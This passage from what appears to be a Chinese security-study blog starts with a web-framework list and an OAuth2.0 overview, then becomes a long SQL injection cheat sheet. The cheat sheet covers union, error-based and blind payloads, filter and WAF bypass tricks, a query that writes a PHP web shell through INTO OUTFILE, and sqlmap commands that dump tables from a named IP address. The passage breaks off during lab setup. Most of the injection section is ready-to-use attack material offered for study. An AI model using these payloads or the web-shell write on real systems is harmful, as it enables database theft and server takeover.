class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Java</span><br><span class="line">Stucts2</span><br><span class="line">Spring MVC / Spring Boot</span><br><span class="line"></span><br><span class="line">PHP</span><br><span class="line">ThinkPHP <span class="number">3</span></span><br><span class="line">ThinkPHP <span class="number">5</span></span><br><span class="line">CI</span><br><span class="line">Laravel -&gt; Symfony</span><br><span class="line">Yii</span><br><span class="line">Yaf</span><br><span class="line"></span><br><span class="line">DeDeCMS</span><br><span class="line">PHPCMS</span><br><span class="line">帝国CMS</span><br><span class="line">WordPress</span><br><span class="line">Drupal</span><br><span class="line">Joomla!</span><br><span class="line">phpBB</span><br><span class="line">Discuz!</span><br><span class="line">phpWind</span><br><span class="line"></span><br><span class="line">Python</span><br><span class="line">Django</span><br><span class="line">Flask</span><br><span class="line"></span><br><span class="line">Ruby</span><br><span class="line">ruby on rails</span><br><span class="line"></span><br><span class="line">Nodejs</span><br><span class="line">Express / Koa</span><br><span class="line">Nuxtjs</span><br><span class="line">Eggjs</span><br><span class="line"></span><br><span class="line">Golang</span><br><span class="line">Iris</span><br></pre></td></tr></table></figure><h3 id="OAuth2-0"><a href="#OAuth2-0" class="headerlink" title="OAuth2.0"></a>OAuth2.0</h3><p><strong>作用</strong> ：让(第三方)客户端安全可控地获取用户的授权</p><h4 id="名词定义"><a href="#名词定义" class="headerlink" title="名词定义"></a>名词定义</h4><ul><li>Third-party application：第三方应用程序，又称为客户端</li><li>HTTP service：HTTP服务提供商</li><li>Resource Owner：资源所有者，又称用户</li><li>User Agent：用户代理，例如，浏览器</li><li>Authorization server：认证服务器</li><li>Resource server：资源服务器</li></ul><h4 id="运行流程"><a href="#运行流程" class="headerlink" title="运行流程"></a>运行流程</h4><p><img src="http://www.ruanyifeng.com/blogimg/asset/2014/bg2014051203.png" alt="avatar"></p><p>​    （A）用户打开客户端以后，客户端要求用户给予授权</p><p>​    （B）用户同意给予客户端授权</p><p>​    （C）客户端使用上一步获得的授权，想认证服务器申请令牌</p><p>​    （D）认证服务器对客户端进行认证以后，确认无误，同意发放令牌</p><p>​    （E）客户端使用令牌，向资源服务器申请获取资源</p><p>​    （F）资源服务器确认令牌无误，同意客户端开放资源</p><h3 id="客户端的授权模式"><a href="#客户端的授权模式" class="headerlink" title="客户端的授权模式"></a>客户端的授权模式</h3><ul><li>授权码模式（authorization code）</li><li>简化模式（implicit）</li><li>密码模式（resource owner password credentials）</li><li>客户端模式（client credentials）</li></ul><h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><ul><li><p>基于从服务器接收到的响应</p><ul><li>基于错误的SQL注入</li><li>联合查询的类型</li><li>堆查询注入</li><li>SQL盲注<ul><li>基于布尔SQL盲注</li><li>基于时间的SQL盲注</li><li>基于报错的SQL盲注</li></ul></li></ul></li><li><p>基于如何处理输入的SQL查询（数据类型）</p><ul><li>基于字符串</li><li>数字或整数为基础的</li></ul></li><li><p>基于程度和顺序的注入(哪里发生了影响)</p><ul><li><p>一次注入</p><p>输入的注入语句对WEB直接产生了影响，出现了结果</p></li><li><p>二次注入</p><p>类似存储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，</p><p>通过其它的辅助间接的对WEB产生危害，这样的就被称为是二次注入</p></li></ul></li><li><p>基于注入点的位置上的</p><ul><li>通过用户输入的表单域的注入</li><li>通过cookie注入</li><li>通过服务器变量注入（基于头部信息的注入）</li></ul></li></ul><p>SQLi 一条龙</p><p>1.判断是否存在注入</p><p>2.猜解SQL查询语句中的字段数</p><p>3.确定显示的字段顺序</p><p>4.获取当前数据库</p><p>5.获取数据库中的表</p><p>6.获取表中的字段名</p><p>7.下载数据</p><p>与数据库进行交互的地方就可能存在注入点</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>();<span class="comment">-- 数据库用户名</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">version</span>();<span class="comment">-- MySQL版本</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">database</span>();<span class="comment">-- 数据库名</span></span><br><span class="line"><span class="keyword">select</span> @@basedir;<span class="comment">-- 数据库安装路径</span></span><br><span class="line"><span class="keyword">select</span> @@datadir;<span class="comment">-- 数据库路径</span></span><br><span class="line"><span class="keyword">select</span> @@version_compile_os；    <span class="comment">-- 操作系统版本</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%secure%'</span>;<span class="comment">-- </span></span><br><span class="line">if(expr,v1,v2)<span class="comment">-- expr正确则v1，否则v2</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> expr <span class="keyword">then</span> v1 <span class="keyword">else</span> v2 <span class="keyword">end</span>;  <span class="comment">-- 与 if 功能相同</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="string">'11'</span>, <span class="string">'22'</span>, <span class="string">'33'</span>);<span class="comment">-- 字符串连接 112233</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">concat_ws</span>(x, s1,s2...sn)<span class="comment">-- 以 x 作为连接符，将字符串连接</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>()<span class="comment">-- 把查询出来的多行连接起来</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">mid</span>(<span class="keyword">str</span>, <span class="keyword">start</span>, <span class="keyword">count</span>)<span class="comment">-- 从start开始截取count个字符</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>(), <span class="number">1</span>, <span class="number">1</span>)<span class="comment">-- 与mid同</span></span><br><span class="line"><span class="comment"># 如果用不了逗号，直接 from start for count</span></span><br><span class="line"><span class="comment"># union select * from (select 1)a join (select 2)b == union select 1,2</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(<span class="keyword">str</span>, <span class="keyword">count</span>)<span class="comment">-- 截取左边count个字符</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">ord</span>()<span class="comment">-- 返回第一个字符的ASCII码</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">ascii</span>()<span class="comment">-- 与ord同</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">char</span>(<span class="number">32</span>, <span class="number">58</span>, <span class="number">32</span>)<span class="comment">-- ' : ' 即空格+ : +空格</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">database</span>());</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;<span class="comment">-- 不加限制条件将删除整张表</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> ds_name;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">column</span> column_name;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> table_name;</span><br><span class="line"><span class="keyword">update</span> table_name <span class="keyword">set</span> column_name=<span class="string">'new'</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;  <span class="comment">-- 更新</span></span><br><span class="line"><span class="comment">/*!50000select*/</span></span><br><span class="line">where id = 0.1 union <span class="keyword">select</span> ...</span><br><span class="line"><span class="keyword">xor</span>, ||, &amp;&amp;, !, <span class="keyword">not</span></span><br></pre></td></tr></table></figure><p>常用语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">or 1=1<span class="comment">--+</span></span><br><span class="line">'or 1=1<span class="comment">--+</span></span><br><span class="line">"or 1=1<span class="comment">--+</span></span><br><span class="line">)or 1=1<span class="comment">--+</span></span><br><span class="line">')or 1=1<span class="comment">--+</span></span><br><span class="line">") or 1=1<span class="comment">--+</span></span><br><span class="line">"))or 1=1<span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><h5 id="union-注入"><a href="#union-注入" class="headerlink" title="union 注入"></a>union 注入</h5><p>所查询的字段数需与主查询一致</p><p>字段数可先用 order by x 来确定</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure><h5 id="information-schema-注入"><a href="#information-schema-注入" class="headerlink" title="information_schema 注入"></a>information_schema 注入</h5><p>存储数据库信息的数据库</p><blockquote><p><strong>数据库名</strong></p><p>schemata =&gt; schema_name</p><p>tables =&gt; table_schema</p><p>columns =&gt; table_schema</p><p><strong>表名</strong></p><p>tables =&gt; table_name</p><p>columns =&gt; table_name</p><p><strong>列名</strong></p><p>columns =&gt; columns_name</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">-- 获取当前数据库中所有表</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="number">0x7365637265745f666c6167</span>; <span class="comment">-- 获得所有列名（字段），table_name 参数进行十六进制编码后可绕过引号被过滤</span></span><br><span class="line">-1′ or 1=1 union <span class="keyword">select</span> <span class="keyword">group_concat</span>(user_id,first_name,last_name),<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">#</span></span><br><span class="line"><span class="comment">-- 下载数据</span></span><br><span class="line"><span class="number">-1</span>′ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">#  -- 获取表中的字段名</span></span><br></pre></td></tr></table></figure><h5 id="函数报错信息注入"><a href="#函数报错信息注入" class="headerlink" title="函数报错信息注入"></a>函数报错信息注入</h5><blockquote><p> 前提：后台没有屏蔽数据库报错信息，在语法发生错误时会输出到前端</p></blockquote><p>常用报错函数：updatexml(), extractvalue(), floor() <a href="https://blog.csdn.net/whatday/article/details/63683187" target="_blank" rel="noopener">十种MySQL报错注入</a>  <a href="http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">【SQL注入】报错注入姿势总结</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)));%23</span><br><span class="line">and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">user</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);%23</span><br></pre></td></tr></table></figure><p>基于函数报错信息获取（select, insert, update, delete)</p><h5 id="insert-update-delete-注入"><a href="#insert-update-delete-注入" class="headerlink" title="insert / update / delete 注入"></a>insert / update / delete 注入</h5><p>结合函数报错信息，将函数插入到语句中</p><h5 id="http-header-注入"><a href="#http-header-注入" class="headerlink" title="http header 注入"></a>http header 注入</h5><p>如 <code>XFF</code>，<code>referer</code></p><p>观察点：后台收集了请求头中的信息，并存入到数据库中</p><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>结合 and 进行逻辑判断</p><p>效率太低，写脚本爆</p><h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>无显示回显，可在以前的基础上加入 <code>sleep()</code> 语句，若明显延迟，则注入成功</p><p><code>BENCHMARK(count,expr)</code>  执行 <code>count</code> 次的 <code>expr</code>，如 BENCHMARK(10000000,SHA(‘1’))</p><p>即使 <code>sleep</code> 和 <code>benchmark</code> 都被过滤了，但是我们依然可以通过让Mysql进行复杂运算，</p><p>以达到延时的效果，比如可以用字段比较多的表来计算笛卡尔积</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) </span><br><span class="line"><span class="keyword">from</span> information_schema.columns A, </span><br><span class="line">information_schema.columns B, </span><br><span class="line">information_schema.columns C<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>还有 <code>get_lock()</code></p><h5 id="利用注入写入后门"><a href="#利用注入写入后门" class="headerlink" title="利用注入写入后门"></a>利用注入写入后门</h5><p>前提：开启 secure_file_priv，并且具有写的权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'&lt;?php system($_GET["cmd"])?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'H:\\a.php'</span><span class="comment">--%20</span></span><br></pre></td></tr></table></figure><p><strong>POST 登录框 sqlmap跑法</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://47.96.118.255:33066/" --forms --dbs</span><br><span class="line">sqlmap -u "http://47.96.118.255:33066/" --forms -D news --tables</span><br><span class="line">sqlmap -u "http://47.96.118.255:33066/" --forms -D news -T secret_table --dump</span><br></pre></td></tr></table></figure><p><strong>自定义注入位置，如 XFF 注入</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://192.168.118.142/" --headers="X-Forwarded-For: *" --banner</span><br></pre></td></tr></table></figure><p><strong>猜解数据表</strong></p><p>找到注入点后，进行猜解</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and exists(<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>)  <span class="comment">-- 表存在页面就会返回正常，否则报错</span></span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> * <span class="keyword">from</span> amdin)</span><br></pre></td></tr></table></figure><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>检测被过滤的关键词：</p><ul><li>id = 1 ^ (length(‘xxx’)=3)</li></ul><h4 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h4><ul><li><p>使用注释绕过，/*<em>/ (/\</em>1*/)</p></li><li><p>使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用 ( ) 包围</p><p>  例如：select(user())from user where(1=1)and(2=2)</p></li><li><p>使用符号替代空格 </p>  <figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">%<span class="selector-tag">20</span></span> 空格</span><br><span class="line"><span class="tag">%<span class="selector-tag">09</span></span>TAB 键（水平）</span><br><span class="line"><span class="tag">%<span class="selector-tag">0b</span></span>TAB 键（垂直）</span><br><span class="line"><span class="tag">%<span class="selector-tag">0d</span></span>return 功能</span><br><span class="line"><span class="tag">%<span class="selector-tag">0c</span></span>新的一页</span><br><span class="line"><span class="tag">%<span class="selector-tag">a0</span></span>空格</span><br><span class="line"><span class="tag">%<span class="selector-tag">0a</span></span>新建一行</span><br></pre></td></tr></table></figure></li></ul><h4 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name=<span class="string">"users"</span></span><br></pre></td></tr></table></figure><p>如果引号被过滤了，那么上面的<code>where</code>子句就失效了，此时可以使用<strong>十六进制</strong>。<br><code>users</code>的十六进制的字符串是<code>7573657273</code>。那么最后的sql语句就变为了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name  <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name=<span class="number">0x7573657273</span></span><br></pre></td></tr></table></figure><p><strong>宽字节绕过</strong></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span>bf<span class="meta">%</span><span class="number">27</span> <span class="meta">%</span>df<span class="meta">%</span><span class="number">27</span> <span class="meta">%</span>aa<span class="meta">%</span><span class="number">27</span></span><br></pre></td></tr></table></figure><h4 id="逗号"><a href="#逗号" class="headerlink" title="逗号"></a>逗号</h4><p><code>substr(), mid()</code> 里的逗号可用 <code>from for</code> 代替</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>(<span class="number">0</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">mid</span>(<span class="keyword">database</span>(<span class="number">0</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>对于 <code>limit</code> 里面的逗号可以使用 <code>offset</code> 绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>  </span><br><span class="line">&lt;=&gt;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h4 id="比较符"><a href="#比较符" class="headerlink" title="比较符"></a>比较符</h4><p>大于、小于可用 <code>greatest(), least()</code> 代替，还可以 <code>between and</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>))&gt;<span class="number">64</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">greatest</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)=<span class="number">64</span></span><br></pre></td></tr></table></figure><h4 id="条件连接词"><a href="#条件连接词" class="headerlink" title="条件连接词"></a>条件连接词</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">利用符号:</span><br><span class="line"><span class="keyword">and</span> =&gt; &amp;&amp;</span><br><span class="line"><span class="keyword">or</span> =&gt; ||</span><br><span class="line"><span class="keyword">xor</span> =&gt; |</span><br><span class="line">not =&gt; !</span><br><span class="line"></span><br><span class="line">大小写变形: <span class="keyword">Or</span>, <span class="keyword">OR</span>, <span class="keyword">oR</span></span><br><span class="line">添加注释: o<span class="comment">/**/</span>r</span><br><span class="line">编码：hex, urlencode</span><br></pre></td></tr></table></figure><h4 id="union-select-where"><a href="#union-select-where" class="headerlink" title="union, select, where"></a>union, select, where</h4><p>（1）使用注释符绕过：</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//，-- , <span class="comment">/**/</span>, <span class="comment">#, --+, -- -, ;,%00,--a</span></span><br><span class="line">U<span class="comment">/**/</span> NION <span class="comment">/**/</span> SE<span class="comment">/**/</span> LECT <span class="comment">/**/</span><span class="literal">user</span>，pwd from <span class="literal">user</span></span><br></pre></td></tr></table></figure><p>（2）使用大小写绕过：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">-1</span>'<span class="built_in">UnIoN</span><span class="comment">/**/</span><span class="built_in">SeLeCT</span></span><br></pre></td></tr></table></figure><p>（3）内联注释绕过：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1'<span class="comment">/*!UnIoN*/</span> <span class="keyword">SeLeCT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">concat</span>(<span class="comment">/*!table_name*/</span>) <span class="keyword">FrOM</span> <span class="comment">/*information_schema*/</span>.tables <span class="comment">/*!WHERE */</span><span class="comment">/*!TaBlE_ScHeMa*/</span> <span class="keyword">like</span> <span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>（4） 双关键字绕过：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">-1</span>'UNIunionONSeLselectECT1,<span class="number">2</span>,<span class="number">3</span>–-</span><br></pre></td></tr></table></figure><p>（5）科学计数法</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id</span>=<span class="number">0</span>e1union</span><br></pre></td></tr></table></figure><h4 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h4><p>常用注释符：<code>#, --+, /**/</code>，可以用 <code>;%00</code> 代替</p><p>不用注释符，与后面的语句构造闭合就行，如 <code>||&#39;1</code>，恰好与 <code>’ LIMIT 0,1</code> 闭合</p><h4 id="等号"><a href="#等号" class="headerlink" title="等号"></a>等号</h4><p>使用 <code>like 、rlike 、regexp</code> 或者  <code>&lt; , &gt;</code></p><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><p>sqlmap 中<code>--file-read</code>参数，可以读取服务器端任意文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap -u "127.0.0.1/index.php?id=1 %df'" --file-read="./index.php"</span><br></pre></td></tr></table></figure><p>确定字段数：order by n，select 1,2,…,n</p><p>确定显示位：select 1,2,3,4,5 ，然后看显示哪个数字，之后的查询语句最好用@或者NULL，防止数据类型不匹配而造成的测试失败，即 <code>select @, @, NULL</code></p><p><a href="http://php.net/manual/zh/reference.pcre.pattern.modifiers.php" target="_blank" rel="noopener">preg_match()</a></p><ul><li>i ==&gt; 大小写不敏感</li><li>m ==&gt; 可多行匹配</li><li>s ==&gt; <code>.</code>匹配所有字符，包括换行符</li><li>x ==&gt; </li></ul><p><strong>类型</strong></p><ul><li><p>宽字节注入</p></li><li><p>花式绕 MySQL</p><p>  结合PHP特性</p></li><li><p>绕关键词检测拦截</p><p>  大小写？</p></li><li><p>MongoDB 注入</p><p>  NoSQLmap</p></li><li><p>二次注入</p><p>  插入型，从另一个界面插入</p></li></ul><p><strong>思路</strong></p><ul><li>简单注入，手工或sqlmap跑</li><li>判断注入点，是否是http头注入？是否在图片处注入</li><li>判断注入类型</li><li>利用报错信息注入</li><li>尝试各种绕过过滤的方法</li><li>查找是否是通用某模板存在的注入漏洞，比如 ThinkPHP 3.2</li></ul><p><strong>Tricks</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">sql-mode = "STRICT_TRANS_TABLES"(默认未开启)</span><br><span class="line">插入长数据截断，插入'admin                      x'绕过或越权访问(束缚攻击？)</span><br><span class="line"></span><br><span class="line">注意二次注入</span><br><span class="line">isg2015 web350 username 从 session 中直接带入查询，利用数据库字段长度截断，</span><br><span class="line">\ 被 gpc 后为 \\，但是被截断了只剩下一个 \，引发注入</span><br><span class="line"></span><br><span class="line">如果猜解不出数据库的字段，搜索后台，查看源代码，源代码登陆时的表单中的字段一般和数据库的相同</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 绕过安全狗</span></span><br><span class="line"><span class="meta">sel%</span><span class="bash">ect</span></span><br><span class="line">针对 asp + access，首先来挖掘一下数据库的特性：</span><br><span class="line">1.可代替空格的字符：%09, %0A, %0C, %0D</span><br><span class="line">2.可截断都免语句的注释符有：%00, %16, %22, %27</span><br><span class="line">3.当 %09, %0A, %0C或%0D 超过一定长度后，安全狗的防御便失效了</span><br><span class="line">4.UserAgent：BaiduSpider</span><br><span class="line"></span><br><span class="line">有 magic_quotes_gpc = on 的情况下，</span><br><span class="line">提交的参数如果带有单引号"'"，就会被自动转义"\'"，使很多注入攻击无效</span><br><span class="line"></span><br><span class="line">gbk 双字节编码：一个汉字用两个字节表示，首字节都应 0x81-0xFE,</span><br><span class="line">尾字节对应 0x40-0xfe(除0x7f)，刚好涵盖了转义字符\对应的编码 0x5c</span><br><span class="line"></span><br><span class="line">0xD50x5C 对应了汉字“诚”，URL编码用百分号加字符的16进制编码表示字符，</span><br><span class="line">于是 %d5%5c 经URL解码后为“诚”</span><br><span class="line">0xD50x5c 不是唯一可以绕过单引号转义的字符，0x81-0xFE 开头 + 0x5c 的字符应该都可以</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 偏移注入</span></span><br><span class="line">2.select * from admin as inner join </span><br><span class="line">  index.asp?id=886and 1=2 union select 1,2,3,4,* from(admin as a inner join admin as   b on a.id=b.id)</span><br><span class="line"> 查询条件是 a 表的 id 列与 b 表的 id 列相等，返回所有相等的行，显然，a,b都是同一个表，当然全部返回</span><br></pre></td></tr></table></figure><p>Access 是以单文件，mdb 格式，以表的形式存在，所以数据库也就只有一个文件，只能靠暴力猜解。</p><blockquote><p>Access  -&gt;  表名  -&gt;  列名  -&gt;  数据</p></blockquote><h3 id="Sqli-labs"><a href="#Sqli-labs" class="headerlink" title="Sqli-labs"></a>Sqli-labs</h3><h4 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Audi-1/sqli-labs.git</span><br><span class="line"></span><br><span 